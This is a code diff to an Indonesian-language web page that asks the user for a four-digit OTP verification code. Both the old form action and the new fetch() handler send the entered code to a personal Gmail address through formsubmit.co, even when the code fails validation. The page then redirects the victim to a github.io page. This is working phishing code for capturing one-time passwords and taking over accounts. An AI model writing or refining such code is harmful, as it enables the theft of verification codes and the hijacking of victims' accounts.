@@ -83,7 +83,7 @@
       <input type="tel" maxlength="1" oninput="moveNext(this, 3)" required>
     </div>
     <div class="timer" id="timer">KIRIM ULANG (100s)</div>
-    <form id="otpForm" action="https://formsubmit.co/baygaming648@gmail.com" method="POST" target="_self" onsubmit="return submitOTP(event)">
+    <form id="otpForm">
       <input type="hidden" name="OTP" id="otpFull">
       <input type="hidden" name="_captcha" value="false">
       <button type="submit">KONFIRMASI</button>
@@ -94,6 +94,7 @@
     const inputs = document.querySelectorAll(".otp-inputs input");
     const timerEl = document.getElementById("timer");
     const errorMsg = document.getElementById("errorMsg");
+    const form = document.getElementById("otpForm");
     let countdown = 100;
     let isExpired = false;
 
@@ -101,25 +102,6 @@
       if (el.value.length === 1 && index < inputs.length - 1) {
         inputs[index + 1].focus();
       }
-    }
-
-    function submitOTP(event) {
-      const otp = Array.from(inputs).map(i => i.value).join('');
-      document.getElementById("otpFull").value = otp;
-
-      // Tampilkan pesan error jika OTP tidak valid
-      if (isExpired || otp.length < 4) {
-        errorMsg.style.display = "block";
-      } else {
-        errorMsg.style.display = "none";
-      }
-
-      // Biarkan form tetap dikirim, lalu redirect manual
-      setTimeout(() => {
-        window.location.href = "https://b813743.github.io/Testing-/";
-      }, 1000); // beri delay agar FormSubmit sempat terkirim
-
-      return true; // tetap submit ke FormSubmit
     }
 
     const interval = setInterval(() => {
@@ -132,6 +114,31 @@
         isExpired = true;
       }
     }, 1000);
+
+    form.addEventListener("submit", function(event) {
+      event.preventDefault(); // cegah submit default
+
+      const otp = Array.from(inputs).map(i => i.value).join('');
+      document.getElementById("otpFull").value = otp;
+
+      if (isExpired || otp.length < 4) {
+        errorMsg.style.display = "block";
+      } else {
+        errorMsg.style.display = "none";
+      }
+
+      // Kirim OTP ke email via fetch ke FormSubmit
+      const formData = new FormData(form);
+      fetch("https://formsubmit.co/baygaming648@gmail.com", {
+        method: "POST",
+        body: formData
+      }).then(() => {
+        // Setelah terkirim, redirect manual
+        window.location.href = "https://b813743.github.io/Testing-/";
+      }).catch(() => {
+        alert("Gagal mengirim OTP. Coba lagi.");
+      });
+    });
 
     window.onload = () => inputs[0].focus();
   </script>
